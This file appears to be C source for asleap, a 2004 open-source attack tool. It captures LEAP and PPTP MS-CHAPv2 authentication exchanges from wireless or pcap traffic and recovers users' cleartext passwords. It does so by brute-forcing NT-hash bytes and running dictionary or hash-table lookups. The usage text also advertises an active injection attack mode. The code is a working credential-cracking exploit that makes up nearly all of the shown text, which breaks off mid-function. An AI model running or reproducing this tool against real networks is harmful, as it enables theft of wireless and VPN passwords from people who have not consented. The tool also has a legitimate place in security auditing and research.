/*
 * asleap - actively recover weak LEAP passwords.  Pronounced "asleep".
 *
 * Copyright (c) 2004, Joshua Wright <jwright@hasborg.com>
 *
 * $Id: asleap.c,v 1.27 2004/11/29 19:56:33 jwright Exp $
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See COPYING for more
 * details.
 *
 * asleap is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

/*
 * Significant code is graciously taken from the following:
 * MS-CHAPv2 and attack tools by Jochen Eisinger, Univ. of Freiburg
 * AirJack drivers by Abaddon.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <ctype.h>
#include <sys/ioctl.h>

#ifdef _LINUX
#include <net/ethernet.h>
#include <pcap-bpf.h>
#include <sys/types.h>
#include <pcap.h>
#include <netpacket/packet.h>
#include <linux/wireless.h>
#include "ajinject.h"
#else
#include "pcap.h"
typedef unsigned char u8;
typedef unsigned short u16;
#endif

#include "asleap.h"
#include "apeek.h"
#include "utils.h"
#include "common.h"
#include "version.h"
#include "sha1.h"

#define SNAPLEN 2312
#ifdef _LINUX
#define PROMISC 1
#else
#define PROMISC 0
#endif
#define TIMEOUT 500 /* for pcap */
#define CHANHOP 2 /* in seconds */
#define PROGNAME "asleap"
#define MAXCLIENTLIST 256
#define MAXCHANNEL 11
#define CHANHOPTIME 500000

#ifndef DLT_TZSP
#define DLT_TZSP 128
#endif

/* Globals */
pcap_t *p = NULL;
u_char *packet;
struct pcap_pkthdr h;
char   errbuf[PCAP_ERRBUF_SIZE];
struct airjack_data ajdata;
struct dump_output wpcap;
int    sockfd_g;


/* prototypes */
void usage(char *message);
void cleanup();
void print_leapexch(struct asleap_data *asleap_ptr);
void print_hashlast2(struct asleap_data *asleap_ptr);
void print_leappw(struct asleap_data *asleap_ptr);
int gethashlast2(struct asleap_data *asleap_ptr);
int getmschappw(struct asleap_data *asleap_ptr);
int findstamac(u8 stamac[6], struct clientlist_data *clientlist);
int addstamac(struct clientlist_data *clientlist, u8 stamac[6], int clntcntr);
int getpacket(struct capturedata_s capturedata);
int testdot1x(unsigned char *packet, struct capturedata_s capdata, int fromds);
int testleap(unsigned char *packet, struct capturedata_s capdata, int fromds);
int populate_offset(struct capturedata_s *capturedata);
int listdevs();
int testleapchal(struct asleap_data *asleap_ptr, struct capturedata_s capdata);
int testleapsuccess(struct asleap_data *asleap_ptr, 
                    struct capturedata_s capdata);
int testleapresp(struct asleap_data *asleap_ptr, struct capturedata_s capdata);
int findlpexch(struct asleap_data *asleap_ptr, int timeout, 
     struct dump_output wpcap, struct capturedata_s capdata);
void asleap_reset(struct asleap_data *asleap);
int stripname(char *name, char *stripname, int snamelen, char delim);
void attack_leap(struct asleap_data *asleap);
void attack_pptp(struct asleap_data *asleap);
int testpptpchal(struct asleap_data *asleap_ptr, struct capturedata_s capdata);
int testpptpresp(struct asleap_data *asleap_ptr, struct capturedata_s capdata);
int testpptpsuccess(struct asleap_data *asleap_ptr, 
                    struct capturedata_s capdata);
void genchalhash(struct asleap_data *asleap);
int getgrelen(unsigned char *packet, struct capturedata_s capdata);


int stripname(char *name, char *stripname, int snamelen, char delim) {
    char *loc;

    if (name == NULL)
        return -1;

    loc = strchr(name, delim);
    if (loc == NULL) {
        strncpy(stripname, name, snamelen);
        return(1);
    } else {
        ++loc;
        strncpy(stripname, loc, snamelen);
        return(0);
    }
}




/* Program usage. */
void usage(char *message) {

    if (strlen(message) > 0) {
        printf("%s: %s\n", PROGNAME, message);
    }

    printf("Usage: %s [options]\n", PROGNAME);
    printf("\n"
    "\t-r \tRead from a libpcap file\n"
    "\t-i \tInterface to capture on\n"
    "\t-f \tDictionary file with NT hashes\n"
    "\t-n \tIndex file for NT hashes\n"
    "\t-w \tWrite the LEAP exchange to a libpcap file\n"
    "\t-s \tSkip the check to make sure authentication was successful\n"
#ifdef _LINUX
    "\t-a \tPerform an active attack (faster, requires AirJack drivers)\n"
    "\t-c \tSpecify a channel (defaults to current)\n"
    "\t-o \tPerform channel hopping\n"
    "\t-t \tSpecify a timeout watching for LEAP exchange (default 5 seconds)\n"
#endif
    "\t-D \tList available devices for live capture\n"
    "\t-h \tOutput this help information and exit\n"
    "\t-v \tPrint verbose information (more -v for more verbosity)\n"
    "\t-V \tPrint program version and exit\n"
    "\t-W \tASCII dictionary file (special purpose)\n"
    "\n");
}



void print_pptpexch(struct asleap_data *asleap_ptr) {

    int j;

    printf("\tusername:          ");
    if (IsBlank(asleap_ptr->username)) {
        printf("no username");
    } else {
        printf("%s\n", asleap_ptr->username);
    }

    printf("\tauth challenge:    ");
    if (asleap_ptr->pptpauthchal == NULL) {
        printf("no challenge");
    } else {
        for (j=0; j < 16; j++) printf("%02x", asleap_ptr->pptpauthchal[j]);
    }
    printf("\n");

    printf("\tpeer challenge:    ");
    if (asleap_ptr->pptppeerchal == NULL) {
        printf("no challenge");
    } else {
        for (j=0; j < 16; j++) printf("%02x", asleap_ptr->pptppeerchal[j]);
    }
    printf("\n");

    printf("\tpeer response:     ");
    if (asleap_ptr->response == NULL) {
        printf("no response");
    } else {
        for (j=0; j < 24; j++) {
            printf("%02x", asleap_ptr->response[j]);
        }
    }
    printf("\n");

}


void print_leapexch(struct asleap_data *asleap_ptr) {

    int j;

    printf("\tusername:          ");
    if (IsBlank(asleap_ptr->username)) {
        printf("no username");
    } else {
        printf("%s\n", asleap_ptr->username);
    }

    printf("\tchallenge:         ");
    if (asleap_ptr->challenge == NULL) {
        printf("no challenge");
    } else {
        for (j=0; j < 8; j++) printf("%02x", asleap_ptr->challenge[j]);
    }
    printf("\n");

    printf("\tresponse:          ");
    if (asleap_ptr->response == NULL) {
        printf("no response");
    } else {
        for (j=0; j < 24; j++) {
            printf("%02x", asleap_ptr->response[j]);
        }
    }
    printf("\n");

}

void print_hashlast2(struct asleap_data *asleap_ptr) {

    printf("\thash bytes:        ");
    if (asleap_ptr->endofhash[0] == 0 && asleap_ptr->endofhash[1] == 0) {
        printf("no NT hash ending known.");
    } else {
        printf("%02x%02x", asleap_ptr->endofhash[0], asleap_ptr->endofhash[1]);
    }
    printf("\n");

}


void print_leappw(struct asleap_data *asleap_ptr) {

    int j;

    printf("\tNT hash:           ");
    /* Test the first 4 bytes of the NT hash for 0's.  A nthash with 4
       leading 0's is unlikely, a match indicates a unused field */
    if (asleap_ptr->nthash[0] == 0 && asleap_ptr->nthash[1] == 0 &&
        asleap_ptr->nthash[2] == 0 && asleap_ptr->nthash[3] == 0) {
        printf("no matching NT hash was found.");
    } else {
        for (j=0; j < 16; j++) {
            printf("%02x", asleap_ptr->nthash[j]);
        }
    }
    printf("\n");

    printf("\tpassword:          ");
    if (IsBlank(asleap_ptr->password)) {
        printf("no matching password was found.");
    } else {
        printf("%s", asleap_ptr->password);
    }
    printf("\n");

}


void cleanup() {

    if (p != NULL) {
        printf("Closing pcap ...\n");
        pcap_close(p);
    }
    if (wpcap.wp != NULL) {
        printf("Closing output pcap ...\n");
#ifdef _LINUX
        pcap_dump_flush(wpcap.wp);
#endif
        pcap_dump_close(wpcap.wp);
    }

    exit(0);
}


int gethashlast2(struct asleap_data *asleap_ptr) {

    int i;
    unsigned char zpwhash[7] = { 0, 0, 0, 0, 0, 0, 0 };
    unsigned char cipher[8];

    for (i = 0; i <= 0xffff; i++) {
        zpwhash[0] = i >> 8;
        zpwhash[1] = i & 0xff;

        DesEncrypt(asleap_ptr->challenge, zpwhash, cipher);
        if (memcmp(cipher, asleap_ptr->response + 16, 8) == 0) {
            /* Success in calculating the last 2 of the hash */
            /* debug - printf("%2x%2x\n", zpwhash[0], zpwhash[1]); */
            asleap_ptr->endofhash[0] = zpwhash[0];
            asleap_ptr->endofhash[1] = zpwhash[1];
            return 0;
        }
    }

    return(1);
}


/* Accepts the populated asleap_data structure with the challenge and 
   response text, and our guess at the full 16-byte hash (zpwhash). Returns 1
   if the hash does not match, 0 if it does match. */
int testchal(struct asleap_data *asleap_ptr, unsigned char *zpwhash) {

    unsigned char cipher[8];

    DesEncrypt(asleap_ptr->challenge, zpwhash, cipher);
    if (memcmp(cipher, asleap_ptr->response, 8) != 0)
        return(1);

    DesEncrypt(asleap_ptr->challenge, zpwhash + 7, cipher);
    if (memcmp(cipher, asleap_ptr->response + 8, 8) != 0)
        return(1);

    /* else - we have a match */
    return(0);
}

/* Use a supplied dictionary file instead of the hash table and index file */
int getmschapbrute(struct asleap_data *asleap_ptr) {

    FILE *wordlist;
    char password[MAX_NT_PASSWORD+1];
    unsigned char pwhash[MD4_SIGNATURE_SIZE];
    unsigned long long count = 0;

    if (*asleap_ptr->wordfile == '-') {
        wordlist = stdin;
    } else {
        if ((wordlist = fopen(asleap_ptr->wordfile, "rb")) == NULL) {
            perror("fopen");
            return -1;
        }
    }

    while (!feof(wordlist)) {

        fgets(password, MAX_NT_PASSWORD+1, wordlist);
        /* Remove newline */
        password[strlen(password)-1] = 0;

#ifndef _OPENSSL_MD4
        /* md4.c seems to have a problem with passwords longer than 31 bytes.
           This seems odd to me, but it should have little impact on our
           final product, since I assume there are few passwords we will be
           able to identify with a dictionary attack that are longer than 31
           bytes. */
        password[31] = 0;
#endif

        NtPasswordHash(password, strlen(password), pwhash);

        count++;
        if ((count % 500000) == 0) {
            printf("\033[K\r");
            printf("        Testing %lld: %s\r", count, password);
            fflush(stdout);
        }

        if (pwhash[14] != asleap_ptr->endofhash[0] ||
            pwhash[15] != asleap_ptr->endofhash[1])
                continue;

        if (testchal(asleap_ptr, pwhash) == 0) {
            /* Found a matching password! w00t! */
            memcpy(asleap_ptr->nthash, pwhash, 16);
            strncpy(asleap_ptr->password, password, strlen(password));
            fclose(wordlist);
            return(1);
        }
    }
    return 0;
}
        


/* Brute-force all the matching NT hashes to discover the clear-text password */
int getmschappw(struct asleap_data *asleap_ptr) {

    unsigned char zpwhash[16] =
        { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    struct hashpass_rec rec;
    struct hashpassidx_rec idxrec;
    char password_buf[MAX_NT_PASSWORD];
    int  passlen, recordlength, passwordlen, i;
    FILE *buffp, *idxfp;

    /* If the user passed an index file for our reference, fseek to
       map the file and perform lookups based on indexed offsets.
       If there is no index file, perform a linear search. 
    */

    if (IsBlank(asleap_ptr->dictidx)) {

        /* We have no index file.  Do a linear search */
        if((buffp = fopen(asleap_ptr->dictfile, "rb")) == NULL) {
            perror("[getmschappw] fopen");
            return(-1);
        }

        fflush(stdout);
        while(!feof(buffp)) {

            memset(&rec, 0, sizeof(rec));
            memset(&password_buf, 0, sizeof(password_buf));
            memset(&zpwhash, 0, sizeof(zpwhash));
            fread(&rec.rec_size, sizeof(rec.rec_size), 1, buffp);
            recordlength = abs(rec.rec_size);
            passlen = (recordlength - (17)); 
            fread(&password_buf, passlen, 1, buffp);
            fread(&zpwhash, 16, 1, buffp);
        
        /* Test last 2 characters of NT hash value of the current entry in the
           dictionary file.  If the 2 bytes of the NT hash don't
           match the calculated value that we store in asleap.endofhash, then
           this NT hash isn't a potential match.  Move on to the next entry. */
            if (zpwhash[14] != asleap_ptr->endofhash[0] ||
                zpwhash[15] != asleap_ptr->endofhash[1]) {
                /* last 2 bytes of hash don't match - continue */
                continue;
            }

            /* With a potential match, test with this challenge */
            if (testchal(asleap_ptr, zpwhash) == 0) {
                /* Found a matching password!  Store in the asleap_ptr struct */
                memcpy(asleap_ptr->nthash, zpwhash, 16);
                strncpy(asleap_ptr->password, password_buf,
                    strlen(password_buf));
                fclose(buffp);
                return(1);
            }
        }

        /* Could not find a matching NT hash */
        fclose(buffp);

    } else {  /* Use referenced index file for hash searches */

        memset(&idxrec, 0, sizeof(idxrec));

        if ((idxfp = fopen(asleap_ptr->dictidx, "rb")) == NULL) {
            perror("[getmschappw] Cannot open index file");
            return(-1);
        }

        /* Open the file with a buffered file handle */
        if((buffp = fopen(asleap_ptr->dictfile, "rb")) == NULL) {
            perror("[getmschappw] fopen");
            return(-1);
        }

        /* Read through the index file until we find the entry that matches
           our hash information */
        while (idxrec.hashkey[0] != asleap_ptr->endofhash[0] ||
               idxrec.hashkey[1] != asleap_ptr->endofhash[1]) {

            if (fread(&idxrec, sizeof(idxrec), 1, idxfp) != 1) {
                /* Unsuccessful fread, or EOF */
                printf("\tReached end of index file.\n");
                fclose(idxfp);
                fclose(buffp);
                return(0);

            }
        }


        /* The offset entry in the idxrec struct points to the first
           hash+pass record in the hash+pass file that matches our offset.  The
           idxrec struct also tells us how many entries we can read from the
           hash+pass file that match our hashkey information.  Collect records
           from the hash+pass file until we read through the number of records
           in idxrec.numrec */

        /* fseek to the correct offset in the file */
        if (fseeko(buffp, idxrec.offset, SEEK_SET) < 0) {
            perror("[getmschappw] fread");
            fclose(buffp);
            fclose(idxfp);
            return(-1);
        }

        for (i=0; i < idxrec.numrec; i++) {

            memset(&rec, 0, sizeof(rec));
            memset(&password_buf, 0, sizeof(password_buf));
            fread(&rec.rec_size, sizeof(rec.rec_size), 1, buffp);

            /* The length of the password is the record size, 16 for the hash,
               1 for the record length byte. */
            passwordlen = rec.rec_size - 17;

            /* Check for corrupt data conditions, prevent segfault */
            if (passwordlen > MAX_NT_PASSWORD) {
                fprintf(stderr, "Reported password length (%d) is longer than "
                        "the max password length (%d).\n", passwordlen,
                        MAX_NT_PASSWORD);
                return(-1);
            }

            /* Gather the clear-text password from the dict+hash file,
               then grab the 16 byte hash */
            fread(&password_buf, passwordlen, 1, buffp);
            fread(&zpwhash, sizeof(zpwhash), 1, buffp);

            /* Test the challenge and compare to our hash */
            if (testchal(asleap_ptr, zpwhash) == 0) {
                /* Found a matching password!  Store in the asleap_ptr struct */
                memcpy(asleap_ptr->nthash, zpwhash, 16);
                strncpy(asleap_ptr->password, password_buf,
                    strlen(password_buf));
                fclose(buffp);
                fclose(idxfp);
                /* success */
                return(1);
            }

        }

        /* Could not find a match - bummer */
        fclose(buffp);
        fclose(idxfp);

    }

    return(0);

}


/* testdot1x examines a packet and returns a 0 if the packet contains dot1X
 * headers, anything else returns 1.
 */
int testdot1x(unsigned char *packet, struct capturedata_s capdata, int fromds) {

    struct ieee80211 *dot11_ptr;
    struct ieee8021x *dot1x_ptr;

    /* We have a packet, start testing it for EAP-Challenge */
    dot11_ptr = (struct ieee80211 *)&packet[capdata.dot11offset];
    dot1x_ptr = (struct ieee8021x *)&packet[capdata.dot1xoffset];

    /* Examine frames that have 802.11 headers for fromds flag */
    if (capdata.captype == LPCAP_DLTRFMON_PCAP || 
        capdata.captype == LPCAP_DLTTZSP_PCAP ||
        capdata.captype == APEEK_LEGACY_OFFLINE_PCAP ||
        capdata.captype == APEEK_XML_OFFLINE_PCAP) {
        if (dot11_ptr->from_ds != fromds) {
            return(1);
        }
    }
   
	/* Examine this frame for the 802.1x characteristics */
    if (dot1x_ptr->version == 1 && 
		(dot1x_ptr->type == 0 || dot1x_ptr->type == 3)) {
        return(0);
	}

    return(1);
}


/* testgre examines a packet and returns a 0 if the packet contains a PPP
 * payload, anything else returns 1.
 */
int testgre(unsigned char *packet, struct capturedata_s capdata) {

    struct grehdr *gre_ptr;

    /* We have a packet, start testing it for EAP-Challenge */
    gre_ptr = (struct grehdr *)&packet[capdata.iphdroffset+IPHDRLEN];
   
	/* Examine this frame for the PPP protocol type */
    if (ntohs(gre_ptr->type) == GREPROTOPPP) {
        return(0);
	}

    return(1);
}

/* testppp examines a packet and returns a 0 if the packet contains a PPP CHAP
 * payload, anything else returns 1.
 */
int testppp(unsigned char *packet, struct capturedata_s capdata) {

    struct ppphdr *ppp_ptr;
    int offset;

    offset = getgrelen(packet, capdata);
    if (offset < 1) {
        return(-1);
    }

    offset += capdata.iphdroffset;
    offset += IPHDRLEN;
    /* We have a packet, start testing it for EAP-Challenge */
    ppp_ptr = (struct ppphdr *)&packet[offset];
   
	/* Examine this frame for the PPP protocol type */
    if (ntohs(ppp_ptr->proto) == PPPPROTOCHAP) {
        return(0);
	}

    return(1);
}

int getgrelen(unsigned char *packet, struct capturedata_s capdata) {

    struct grehdr *gre_ptr;
    int grelen = GREMINHDRLEN;

    gre_ptr = (struct grehdr *)&packet[capdata.iphdroffset+IPHDRLEN];

    /* Examine this frame for the PPP protocol type */
    if (ntohs(gre_ptr->type) != GREPROTOPPP) {
        return(-1);
    }

    if (gre_ptr->flags & GRESYNSETFLAG) grelen += 4;
    if (gre_ptr->flags & GREACKSETFLAG) grelen += 4;
    return(grelen);

} 

/* testleap examines a packet and returns a 0 if the packet contains LEAP
 * headers, anything else returns 1.
 */
int testleap(unsigned char *packet, struct capturedata_s capdata, int fromds) {

    struct ieee80211 *dot11_ptr;
    struct eap_leap *leap_ptr;

    /* We have a packet, start testing it for EAP-Challenge */
    dot11_ptr = (struct ieee80211 *)&packet[capdata.dot11offset];
    leap_ptr = (struct eap_leap *)&packet[capdata.leapoffset];
   
    /* Examine frames that have 802.11 headers for fromds flag */
    if (capdata.captype == LPCAP_DLTRFMON_PCAP || 
        capdata.captype == LPCAP_DLTTZSP_PCAP ||
        capdata.captype == APEEK_LEGACY_OFFLINE_PCAP ||
        capdata.captype == APEEK_XML_OFFLINE_PCAP) {
        if (dot11_ptr->from_ds != fromds) {
            return(1);
        }
    }
   
	/* Examine this frame for the LEAP characteristics */
    if (leap_ptr->type == 17 && leap_ptr->version == 1) {
        return(0);
	}

    return(1);
}

int findlpexch(struct asleap_data *asleap_ptr, int timeout, 
     struct dump_output wpcap, struct capturedata_s capdata) {

    struct timeval then, now;
    int    epochstart, elapsed, n;

    gettimeofday(&then, NULL);
    epochstart = ((then.tv_sec * 1000000) + then.tv_usec);

    /* Start a while() loop that ends only when the timeout duration is
       exceeded, or LEAP credentials are discovered. */
    while(1) {

        if ((asleap_ptr->leapchalfound && asleap_ptr->leaprespfound &&
             asleap_ptr->leapsuccessfound))
             return LEAPEXCHFOUND;

        if ((asleap_ptr->pptpchalfound && asleap_ptr->pptprespfound &&
             asleap_ptr->pptpsuccessfound))
             return PPTPEXCHFOUND;

        /* Test for out timeout condition */
        if (timeout != 0) {
            gettimeofday(&now, NULL);
            /* Get elapsed time, in seconds */
            elapsed = 
              ((((now.tv_sec * 1000000) + now.tv_usec) - epochstart) / 1000000);
            if (elapsed > timeout) 
                return LPEXCH_TIMEOUT;
        }

        /* Obtain a packet for analysis */
        n = getpacket(capdata);

        /* Test to make sure we got something interesting */
        if (n < 0) {
            continue;
        } else if (n == 1) {
            if (asleap_ptr->verbose) printf("Reached EOF on pcapfile.\n");
            cleanup(); /* exits */
        }

        if (packet == NULL) {
            continue;
        }

        if (asleap_ptr->verbose > 2) {
            lamont_hdump(packet, h.len); 
            printf("\n");
        }

        /* Test for LEAP packets */
        if (asleap_ptr->leapchalfound == 0 && asleap_ptr->leaprespfound == 0) {
            if (testleapchal(asleap_ptr, capdata) == 1) {
                asleap_ptr->leapchalfound=1;
                continue;
            }
        }

        if (asleap_ptr->leapchalfound == 1 && asleap_ptr->leaprespfound == 0) {
            if (testleapresp(asleap_ptr, capdata) == 1) {
                asleap_ptr->leaprespfound=1;
                continue;
            }
        }

        if (asleap_ptr->leapsuccessfound == 0 
            && asleap_ptr->leapchalfound == 1 
            && asleap_ptr->leaprespfound == 1) {
            if (asleap_ptr->skipeapsuccess) {
                asleap_ptr->leapsuccessfound=1;
                continue;
            } else if (testleapsuccess(asleap_ptr, capdata) == 1) {
                asleap_ptr->leapsuccessfound=1;
                continue;
            }
        }

        /* Test for PPTP packets */
        if (asleap_ptr->pptpchalfound == 0 && asleap_ptr->pptprespfound == 0) {
            if (testpptpchal(asleap_ptr, capdata) == 1) {
                asleap_ptr->pptpchalfound=1;
                continue;
            }
        }

        if (asleap_ptr->pptprespfound == 0 && asleap_ptr->pptpchalfound == 1) {
            if (testpptpresp(asleap_ptr, capdata) == 1) {
                asleap_ptr->pptprespfound=1;
                continue;
            }
        }

        if (asleap_ptr->pptpsuccessfound == 0 
            && asleap_ptr->pptpchalfound == 1 
            && asleap_ptr->pptprespfound == 1) {
            if (testpptpsuccess(asleap_ptr, capdata) == 1) {
                asleap_ptr->pptpsuccessfound=1;
                continue;
            }
        }

    }
}

void genchalhash(struct asleap_data *asleap) {

    SHA1_CTX context;
    unsigned char digest[SHA1_MAC_LEN];
    char strippedname[256];
    int j;

    /* RFC2759 indicates a username "BIGCO\johndoe" must be stripped to 
       contain only the username for the purposes of generating the 8-byte
       challenge. Section 4, */
    stripname(asleap->username, strippedname, sizeof(strippedname), '\\');

    SHA1Init(&context);
    SHA1Update(&context, asleap->pptppeerchal, 16);
    SHA1Update(&context, asleap->pptpauthchal, 16);
    SHA1Update(&context, strippedname, strlen(strippedname));
    SHA1Final(digest, &context);

    memcpy(&asleap->challenge, digest, 8);

    printf("\tchallenge:         ");
    for (j=0; j < 8; j++) printf("%02x", digest[j]);
    printf("\n");
}


void attack_leap(struct asleap_data *asleap) {

    int getmschappwret = 0;

    if (asleap->verbose) 
    printf("\tAttempting to recover last 2 of hash.\n");

    if (gethashlast2(asleap)) {
        printf("\tCould not recover last 2 bytes of hash from the\n");
        printf("\tchallenge/response.  Sorry it didn't work out.\n");
        asleap_reset(asleap);
        return;
    } else {
        print_hashlast2(asleap);
    }    

    if (asleap->verbose) 
    printf("\tStarting dictionary lookups.\n");

    if (!IsBlank(asleap->wordfile)) {
        /* Attack MS-CHAP exchange with a straight dictionary wordlist */
        getmschappwret = getmschapbrute(asleap); 
    } else {
        getmschappwret = getmschappw(asleap);
    }

    if (getmschappwret == 1) {
        /* Success! Print password and hash info */
        print_leappw(asleap);
    } else if (getmschappwret == 0) {
        /* No matching hashes found */
        printf("\tCould not find a matching NT hash.  ");
        printf("Try expanding your password list.\n");
        printf("\tI've given up.  Sorry it didn't work out.\n");
    } else {
        /* Received an error */
        printf("Experienced an error in getmschappw, returned %d.\n",
        getmschappwret);
    }
}


void attack_pptp(struct asleap_data *asleap) {

    int getmschappwret = 0;

    if (asleap->verbose) 
    printf("\tAttempting to recover last 2 of hash.\n");

    /* Generate the 8-byte hash from the auth chal, peer chal and login name */
    genchalhash(asleap);

    if (gethashlast2(asleap)) {
        printf("\tCould not recover last 2 bytes of hash from the\n");
        printf("\tchallenge/response.  Sorry it didn't work out.\n");
        asleap_reset(asleap);
        return;
    } else {
        print_hashlast2(asleap);
    }    

    if (asleap->verbose) 
    printf("\tStarting dictionary lookups.\n");

    getmschappwret = getmschappw(asleap);

    if (getmschappwret == 1) {
        /* Success! Print password and hash info */
        print_leappw(asleap);
    } else if (getmschappwret == 0) {
        /* No matching hashes found */
        printf("\tCould not find a matching NT hash.  ");
        printf("Try expanding your password list.\n");
        printf("\tI've given up.  Sorry it didn't work out.\n");
    } else {
        /* Received an error */
        printf("Experienced an error in getmschappw, returned %d.\n",
        getmschappwret);
    }
}


int testpptpchal(struct asleap_data *asleap_ptr, struct capturedata_s capdata) {

    struct pppchaphdr *pppchap_ptr;
    int offset;

    if (capdata.iphdroffset == 0) {
        return -1;
    }

    if (testgre(packet, capdata) != 0)
        return 0;
    if (testppp(packet, capdata) != 0)
        return 0;

    offset = getgrelen(packet, capdata);
    if (offset < 1)
        return -1;

    offset += capdata.iphdroffset;
    offset += IPHDRLEN;
    offset += PPPGRECHAPOFFSET;
    pppchap_ptr = (struct pppchaphdr *)&packet[offset];

    if (pppchap_ptr->code != 1)
        return 0;

    /* Found the PPTP Challenge frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured PPTP challenge:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump.  If we are not reading from a pcap
    source, we have already kludged h in getpacket to have the
    needed information. */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet); 
    }

    /* We have captured a PPTP challenge packet.  Populate asleap,
    then continue to collect traffic */
    memcpy(asleap_ptr->pptpauthchal, pppchap_ptr->u.chaldata.authchal, 
    sizeof(asleap_ptr->pptpauthchal));
    return 1;
}


int testpptpresp(struct asleap_data *asleap_ptr, struct capturedata_s capdata) {

    struct pppchaphdr *pppchap_ptr;
    int usernamelen;
    int offset;

    if (capdata.iphdroffset == 0) {
        return -1;
    }

    if (testgre(packet, capdata) != 0)
        return 0;
    if (testppp(packet, capdata) != 0)
        return 0;

    offset = getgrelen(packet, capdata);
    if (offset < 1)
        return -1;

    offset += capdata.iphdroffset;
    offset += IPHDRLEN;
    offset += PPPGRECHAPOFFSET;
    pppchap_ptr = (struct pppchaphdr *)&packet[offset];

    if (pppchap_ptr->code != 2)
        return 0;
        
    /* Found the PPTP Response frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured PPTP response:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump.  If we are not reading from a pcap
    source, we have already kludged h in getpacket to have the
    needed information. */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet); 
    }

    memcpy(asleap_ptr->pptppeerchal, pppchap_ptr->u.respdata.peerchal, 16);
    memcpy(asleap_ptr->response, pppchap_ptr->u.respdata.peerresp, 24);
    
    /* We have captured a PPTP response packet.  Populate asleap,
    then continue to collect traffic */
    usernamelen = ntohs(pppchap_ptr->length) - 
        pppchap_ptr->u.respdata.datalen - 5;

    if (usernamelen < sizeof(asleap_ptr->username)) {
        memcpy(asleap_ptr->username, &packet[offset+PPPUSERNAMEOFFSET],
            usernamelen);
    } else {
        fprintf(stderr, "WARNING: reported username length exceeds RFC "
               "specification.\n");
        return(-1);
    }

    return 1;
}



int testleapchal(struct asleap_data *asleap_ptr, struct capturedata_s capdata) {

    struct eap_leap *leap_ptr;

    leap_ptr = (struct eap_leap *)&packet[capdata.leapoffset];

    if (testdot1x(packet, capdata, 1) != 0)
        return 0;
   
    if (testleap(packet, capdata, 1) != 0)
        return 0;

    if (leap_ptr->code != 1)
        return 0;
        
    /* Found the LEAP Challenge frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured LEAP challenge:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump.  If we are not reading from a pcap
    source, we have already kludged h in getpacket to have the
    needed information. */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet); 
    }

    /* We have captured a LEAP challenge packet.  Populate asleap,
    then continue to collect traffic */
    memcpy(asleap_ptr->challenge, &packet[capdata.leapoffset+8], 8);

    /* The username is variable length, but can be calculated by
    taking the reported length of the EAP packet - 16. */
    memcpy(asleap_ptr->username, &packet[capdata.leapoffset+16], 
    (ntohs(leap_ptr->length) - 16));

    return 1;
}


int testpptpsuccess(struct asleap_data *asleap_ptr, 
                    struct capturedata_s capdata) {

    struct pppchaphdr *pppchap_ptr;
    int offset;

    if (capdata.iphdroffset == 0) {
        return -1;
    }

    if (testgre(packet, capdata) != 0)
        return 0;

    if (testppp(packet, capdata) != 0)
        return 0;

    offset = getgrelen(packet, capdata);
    if (offset < 1) 
        return -1;

    offset += capdata.iphdroffset;
    offset += IPHDRLEN;
    offset += PPPGRECHAPOFFSET;
    pppchap_ptr = (struct pppchaphdr *)&packet[offset];

    if (pppchap_ptr->code == 4) {
        if (asleap_ptr->verbose) {
            printf("\n\nCaptured PPTP Failure message:\n");
            lamont_hdump(packet, h.len);
            printf("\n");
        }
        /* Since we got a failure message, we don't need to retain the chal
           and response data, clear it and restart the process */
        asleap_reset(asleap_ptr);
        return 0;
    }

    if (pppchap_ptr->code != 3)
        return 0;
        
    /* Found the PPTP Success frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured PPTP success:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump.  If we are not reading from a pcap
    source, we have already kludged h in getpacket to have the
    needed information. */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet); 
    }

    return 1;
}


int testleapresp(struct asleap_data *asleap_ptr, struct capturedata_s capdata) {

    struct eap_leap *leap_ptr;

    leap_ptr = (struct eap_leap *)&packet[capdata.leapoffset];

    if (testdot1x(packet, capdata, 0) != 0)
        return 0;
   
    if (testleap(packet, capdata, 0) != 0)
        return 0;

    if (leap_ptr->code != 2)
        return 0;
        
    /* Found the LEAP Response frame */
    if (asleap_ptr->verbose) {
        printf("\n\nCaptured LEAP response:\n");
        lamont_hdump(packet, h.len);
        printf("\n");
    }

    /* If a filename was passed for the output file, we write this
    record with pcap_dump */
    if (!IsBlank(wpcap.wfilename)) {
        pcap_dump((u_char *)wpcap.wp, &h, packet);
    }

    memcpy(asleap_ptr->response, &packet[capdata.leapoffset+8], 24);

    return 1;
}


int testleapsuccess(struct asleap_data *asleap_ptr, 
                    struct capturedata_s capdata) {

    struct ieee8021x *dot1x_ptr;
    struct eap_leap *leap_ptr;

    leap_ptr = (struct eap_leap *)&packet[capdata.leapoffset];
    dot1x_ptr = (struct ieee8021x *)&packet[capdata.dot1xoffset];

    if (testdot1x(packet, capdata, 1) != 0)
        return 0;

    if (leap_ptr->code == 4) {
        if (asleap_ptr->verbose) {
            printf("\n\nCaptured LEAP Failure message:\n");
            lamont_hdump(packet, h.len);
            printf("\n");
        }
        /* Since we got a failure message, we don't need to retain the chal
